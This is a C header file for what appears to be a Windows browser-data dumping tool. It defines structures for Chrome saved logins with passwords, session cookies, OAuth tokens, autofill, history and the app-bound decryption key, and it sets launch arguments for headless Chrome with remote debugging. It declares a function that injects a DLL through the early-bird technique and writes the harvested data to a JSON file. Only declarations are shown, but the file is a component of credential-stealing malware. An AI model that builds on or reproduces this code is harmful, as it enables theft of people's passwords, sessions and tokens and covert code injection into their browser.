#pragma once
#ifndef EXE_HEADERS_H
#define EXE_HEADERS_H

#include <Windows.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <stdio.h>

#include "Common.h"

#pragma comment(lib, "shlwapi.lib")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define MAX_DISPLAY_COUNT               16                      // max to output if /all was not provided

#define INITIAL_ARRAY_CAPACITY          MAX_DISPLAY_COUNT       // the initial array length of each element. setting it to 'MAX_DISPLAY_COUNT' will avoid expanding the arrays if not using /all.

#define DEFAULT_OUTPUT_FILE             "ChromeData.json"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define STR_CHROME_PROGID               L"ChromeHTML"

#define STR_CHROME_REGKEY               L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"

#define STR_CHROME_ARGS                 L"--headless --disable-gpu --remote-debugging-port=9222 --disable-background-timer-throttling"

#define PIPE_THREAD_TIMEOUT             (1000 * 10) // 10 secinds

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _TOKEN_ENTRY
{
    LPSTR   pszService;
    PBYTE   pbToken;
    DWORD   dwTokenLen;
    PBYTE   pbBindKey;
    DWORD   dwBindKeyLen;
} TOKEN_ENTRY, *PTOKEN_ENTRY;

typedef struct _COOKIE_ENTRY
{
    LPSTR   pszHostKey;
    LPSTR   pszPath;
    LPSTR   pszName;
    INT64   llExpiresUtc;
    PBYTE   pbValue;
    DWORD   dwValueLen;
} COOKIE_ENTRY, *PCOOKIE_ENTRY;

typedef struct _LOGIN_ENTRY
{
    LPSTR   pszOriginUrl;
    LPSTR   pszActionUrl;
    LPSTR   pszUsername;
    PBYTE   pbPassword;
    DWORD   dwPasswordLen;
    INT64   llDateCreated;
    INT64   llDateLastUsed;
} LOGIN_ENTRY, *PLOGIN_ENTRY;

/*
typedef struct _CREDIT_CARD_ENTRY
{
    LPSTR   pszNameOnCard;
    LPSTR   pszNickname;
    DWORD   dwExpirationMonth;
    DWORD   dwExpirationYear;
    INT64   llDateModified;
    PBYTE   pbCardNumber;
    DWORD   dwCardNumberLen;
} CREDIT_CARD_ENTRY, *PCREDIT_CARD_ENTRY;
*/

typedef struct _AUTOFILL_ENTRY
{
    LPSTR   pszName;
    LPSTR   pszValue;
    INT64   llDateCreated;
    DWORD   dwCount;
} AUTOFILL_ENTRY, *PAUTOFILL_ENTRY;

typedef struct _HISTORY_ENTRY
{
    LPSTR   pszUrl;
    LPSTR   pszTitle;
    DWORD   dwVisitCount;
    INT64   llLastVisitTime;
} HISTORY_ENTRY, *PHISTORY_ENTRY;

typedef struct _BOOKMARK_ENTRY
{
    LPSTR   pszName;
    LPSTR   pszUrl;
    INT64   llDateAdded;
} BOOKMARK_ENTRY, *PBOOKMARK_ENTRY;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _CHROME_DATA
{
    // App-Bound Key
    PBYTE               pbAppBoundKey;
    DWORD               dwAppBoundKeyLen;

    // Tokens
    PTOKEN_ENTRY        pTokens;
    DWORD               dwTokenCount;
    DWORD               dwTokenCapacity;

    // Cookies
    PCOOKIE_ENTRY       pCookies;
    DWORD               dwCookieCount;
    DWORD               dwCookieCapacity;

    // Logins
    PLOGIN_ENTRY        pLogins;
    DWORD               dwLoginCount;
    DWORD               dwLoginCapacity;

    /*
    // Credit Cards
    PCREDIT_CARD_ENTRY  pCreditCards;
    DWORD               dwCreditCardCount;
    DWORD               dwCreditCardCapacity;
    */
    
    // Autofill
    PAUTOFILL_ENTRY     pAutofill;
    DWORD               dwAutofillCount;
    DWORD               dwAutofillCapacity;

    // History
    PHISTORY_ENTRY      pHistory;
    DWORD               dwHistoryCount;
    DWORD               dwHistoryCapacity;

    // Bookmarks
    PBOOKMARK_ENTRY     pBookmarks;
    DWORD               dwBookmarkCount;
    DWORD               dwBookmarkCapacity;

} CHROME_DATA, *PCHROME_DATA;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InjectDllViaEarlyBird(OUT PCHROME_DATA pChromeData);

VOID FreeChromeData(IN OUT PCHROME_DATA pChromeData);

BOOL WriteChromeDataToJson(IN PCHROME_DATA pChromeData, IN LPCSTR pszFilePath, IN BOOL bShowAll);

#endif // !EXE_HEADERS_H